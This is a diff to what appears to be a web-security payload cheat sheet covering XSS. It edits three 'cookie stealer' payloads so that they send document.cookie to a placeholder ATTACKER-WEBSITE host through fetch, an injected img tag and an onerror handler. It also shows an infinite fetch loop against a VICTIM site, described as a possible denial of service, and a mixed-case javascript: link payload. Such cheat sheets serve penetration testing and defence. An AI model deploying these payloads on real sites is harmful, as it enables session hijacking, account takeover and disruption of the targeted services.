@@ -1055,13 +1055,13 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 - Cookie stealers
   - ```JavaScript
-    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.domain});
+    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
     ```
   - ```JavaScript
-    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.domain + '\" />')
+    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
     ```
   - ```HTML
-    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.domain;>
+    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
     ```
 - onbeforeinput + contenteditable
   ```JavaScript
@@ -1076,7 +1076,7 @@ Manually testing for XXE vulnerabilities generally involves
 - Unusual events
   - `onpointerrawupdate` (Chrome only)
   - `onmouseleave`
-- This could lead the page to make infinitely requests eventually causing being blocked by a WAF and being a potential DoS
+- This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
   ```
@@ -1094,7 +1094,7 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 - jAvAsCrIpT
   ```HTML
-  <a href=\"jAvAsCrIpT:alert(1)\">payload</a>
+  <a href="jAvAsCrIpT:alert(1)">payload</a>
   ```
 
 
